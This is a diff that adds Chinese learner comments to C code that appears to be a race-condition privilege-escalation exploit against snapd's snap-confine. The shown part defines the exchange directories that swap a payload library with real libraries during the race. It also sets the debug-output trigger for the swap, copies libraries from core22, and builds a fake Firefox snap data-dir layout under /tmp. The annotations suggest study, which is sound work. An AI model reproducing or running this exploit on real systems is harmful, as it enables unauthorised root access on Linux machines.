@@ -27,46 +27,45 @@
 #include <sys/un.h>
 #include <sys/syscall.h>
 
-/* snap-confine binary path */
+/* snap-confine binary path 限制二进制文件路径 */
 #define SNAP_CONFINE "/usr/lib/snapd/snap-confine"
 
-/* Exchange dirs: swapped during race (payload <-> real libs) */
-#define EXCHANGE_SRC ".snap/usr/lib/x86_64-linux-gnu.exchange"
-#define EXCHANGE_DST ".snap/usr/lib/x86_64-linux-gnu"
+/* 交换目录：比赛期间已交换（有效负载 <-> 真实库） */
+#define EXCHANGE_SRC ".snap/usr/lib/x86_64-linux-gnu.exchange"    //SRC -- source -- 源
+#define EXCHANGE_DST ".snap/usr/lib/x86_64-linux-gnu"             //DST -- destination -- 目的
 
-/* Source of real libs (used to satisfy mimic phase) */
+/* 用于满足模拟阶段的真实库的来源 */
 #define REAL_LIBDIR "/snap/core22/current/usr/lib/x86_64-linux-gnu"
 
-/* Debug output marker after Step 1 (safe point to swap) */
+/* 步骤 1（安全交换点）之后的调试输出标记 */
 #define TRIGGER "dir:\"/tmp/.snap/usr/lib/x86_64-linux-gnu\""
 
-static int copy_file(const char *src, const char *dst)
+static int copy_file(const char *src, const char *dst)    //static 这个函数只在“当前 .c 文件内部可见” | int 这个函数执行完会返回一个整数return 0;成功, return -1;失败 | char * = 字符指针 = 字符串 | const 指向的内容不能被修改
 {
-    char buf[65536];
-    ssize_t n;
-    int fds = open(src, O_RDONLY);
+    char buf[65536];    //64KB 缓冲区
+    ssize_t n;    //保存 read 返回值（读取了多少字节）
+    int fds = open(src, O_RDONLY);    //只读打开源文件
 
     if (fds < 0)
-        return-1;
+        return-1;    //判断是否失败：open 失败返回 -1
 
     /* 0755 so snap-confine can read/execute the libraries */
-    int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+    int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);    //只写，不存在就创建，存在就清空，  这些是库文件，需要可执行权限
 
     if (fdd < 0) {
         close(fds);
-        return-1;
+        return-1;    //关闭已经打开的源文件，防止 fd 泄漏
     }
-    while ((n = read(fds, buf, sizeof(buf))) > 0)
-        write(fdd, buf, n);
-    close(fds);
-    close(fdd);
+    while ((n = read(fds, buf, sizeof(buf))) > 0)    //从源文件读取最多 64KB，n = read(...)：>0读到数据，0文件结束，-1出错
+        write(fdd, buf, n);        //写入目标文件
+    close(fds);    //int fds = open(src, O_RDONLY);
+    close(fdd);    //int fdd = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0755);
     return 0;
 }
 
 /*
- * setup_snap_and_exchange()
- *
- * Create .snap layout and populate exchange dir with real libs.
+ *设置快照并交换数据（操作）
+ *创建 .snap 布局，并将实际的库文件real libs填充到交换目录exchange dir中。
  */
 static int setup_snap_and_exchange(const char *payload_so)
 {
@@ -77,16 +76,16 @@ static int setup_snap_and_exchange(const char *payload_so)
     mkdir(".snap/snap", 0755);
     mkdir(".snap/snap/firefox", 0755);
 
-    /* Create expected firefox data-dir structure */
-    DIR *d = opendir("/snap/firefox");
+    /* Create expected firefox data-dir structure创建预期的 Firefox 数据目录结构 */
+    DIR *d = opendir("/snap/firefox");        //d = “目录流”（目录句柄）,如果成功：d != NULL, 如果失败： d == NULL
     if (d) {
-        struct dirent *ent;
-        while ((ent = readdir(d)) != NULL) {
-            if (ent->d_name[0] != '.' && strcmp(ent->d_name, "current") != 0) {
-                char p[512];
-                snprintf(p, sizeof(p), ".snap/snap/firefox/%s", ent->d_name);
+        struct dirent *ent;    //struct = 把多个不同类型的数据“打包在一起” ,struct变量 用法.  struct指针 用法-> | dirent目录里的“一个文件/子目录”,每个都会被读到 ent
+        while ((ent = readdir(d)) != NULL) {        //readdir(d):返回下一个目录项
+            if (ent->d_name[0] != '.' && strcmp(ent->d_name, "current") != 0) {        //ent->d_name:当前文件/目录的名字 //不是隐藏目录（不是 . 开头）//strcmp(a, b) 0相等 ≠0不相等，!= 0 表示 不等于 "current"
+                char p[512];    //512字节的字符数组（字符串缓冲区）
+                snprintf(p, sizeof(p), ".snap/snap/firefox/%s", ent->d_name);    //p输出缓冲区, ent->d_name替换 %s
                 mkdir(p, 0755);
-                snprintf(p, sizeof(p), ".snap/snap/firefox/%s/data-dir", ent->d_name);
+                snprintf(p, sizeof(p), ".snap/snap/firefox/%s/data-dir", ent->d_name);    //继续用同一个 p（覆盖旧内容）, snprintf限制最大长度 → 安全| sprintf(p, "...", ...)不检查长度 → 可能溢出
                 mkdir(p, 0755);
             }
         }
